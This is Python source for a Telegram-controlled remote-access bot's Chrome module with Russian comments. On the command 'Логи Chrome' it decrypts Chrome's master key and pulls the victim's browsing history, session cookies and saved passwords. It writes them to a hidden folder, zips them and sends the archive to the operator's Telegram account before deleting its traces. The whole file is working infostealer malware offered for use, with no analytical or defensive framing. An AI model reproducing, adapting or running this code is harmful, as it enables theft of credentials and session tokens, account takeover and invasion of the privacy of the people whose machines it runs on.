# ---- Imports ---- #
import os
import win32crypt
import json, base64
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import shutil
import sqlite3
from aiogram import types
# ---- Imports ---- #

###############################################################################
#                                CHROME                                       #
###############################################################################

def Chrome(dp, bot, admin_id):
    @dp.message_handler(text_contains='Логи Chrome')
    async def chrome(message: types.Message):
        await bot.send_message(admin_id, 'Тебя, понял. Занят этим..')
        try:
            def time(date):
                try:
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
                except:
                    return "Can't decode"

            # ========== ПОЛУЧЕНИЕ МАСТЕР-КЛЮЧА ==========
            def get_master_key():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  # Удаляем DPAPI префикс
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                except Exception as e:
                    print(f"Get master key error: {e}")
                    return None

            # ========== ПРАВИЛЬНАЯ РАСШИФРОВКА ==========
            def decrypt_password(encrypted_data, master_key):
                try:
                    # Для Chrome 80+ (AES-GCM)
                    if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
                        # Получаем IV (первые 12 байт после префикса)
                        iv = encrypted_data[3:15]
                        # Получаем зашифрованные данные (все после IV)
                        payload = encrypted_data[15:]
                        # Создаем шифр
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        # Расшифровываем
                        decrypted = cipher.decrypt(payload)
                        # Удаляем тег аутентификации (последние 16 байт)
                        decrypted = decrypted[:-16]
                        return decrypted.decode('utf-8', errors='ignore')
                    else:
                        # Для Chrome < 80 (DPAPI)
                        return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                except Exception as e:
                    print(f"Decrypt error: {e}")
                    return "Ошибка расшифровки"

            # ========== ПОЛУЧАЕМ КЛЮЧ ==========
            master_key = get_master_key()
            if master_key is None:
                await bot.send_message(admin_id, 'Мастер-ключ не получен')
                return

            # Создаем папку
            os.makedirs(r'C:\hesoyam8927163\Chrome', exist_ok=True)
            
            # ========== ИСТОРИЯ ==========
            try:
                history_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
                if os.path.exists(history_db):
                    shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
                    cursor = c.cursor()
                    temp = []
                    with open(rf"C:\hesoyam8927163\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                        for row in cursor.fetchall():
                            result = f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit: {time(row[2])}\n\n"
                            if result not in temp:
                                temp.append(result)
                                history.write(result)
                    c.close()
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
            except Exception as e:
                print(f"History error: {e}")

            # ========== КУКИ ==========
            try:
                cookies_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
                if os.path.exists(cookies_db):
                    shutil.copy2(cookies_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                    c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                    cursor = c.cursor()
                    
                    # Проверяем структуру таблицы cookies
                    cursor.execute("SELECT name FROM pragma_table_info('cookies')")
                    columns = [row[0] for row in cursor.fetchall()]
                    
                    if 'encrypted_value' in columns:
                        results = '[\n'
                        cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies")
                        for row in cursor.fetchall():
                            decrypted_value = decrypt_password(row[6], master_key)
                            results += f'''
            {{
                "domain": "{row[0]}",
                "expirationDate": {row[5]},
                "name": "{row[1]}",
                "httpOnly": {str(bool(row[4])).lower()},
                "path": "{row[2]}",
                "secure": {str(bool(row[3])).lower()},
                "value": "{decrypted_value}"
            }},
                            '''
                        results = results.rstrip(',\n') + '\n]'
                        with open(rf"C:\hesoyam8927163\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
                            cookies.write(results)
                    
                    c.close()
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
            except Exception as e:
                print(f"Cookies error: {e}")

            # ========== ПАРОЛИ ==========
            try:
                login_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
                if os.path.exists(login_db):
                    shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                    conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                    cursor = conn.cursor()
                    
                    with open(r'C:\hesoyam8927163\Chrome\chrome-passwords.txt', "a", encoding='utf-8') as o:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1] if r[1] else ""
                            encrypted_password = r[2]
                            
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            o.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n---\n")
                    
                    conn.close()
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
            except Exception as e:
                print(f"Passwords error: {e}")

            # ========== ОТПРАВКА ==========
            try:
                shutil.make_archive('chrome', 'zip', 'C:\\hesoyam8927163\\Chrome')
                await bot.send_document(admin_id, open('chrome.zip', 'rb'))
                os.remove('chrome.zip')
                shutil.rmtree('C:\\hesoyam8927163')
            except Exception as e:
                print(f"Send error: {e}")
                await bot.send_message(admin_id, 'Ошибка при отправке архива')
                
        except Exception as e:
            print(f"Main error: {e}")
            await bot.send_message(admin_id, f'Ошибка: {e}')

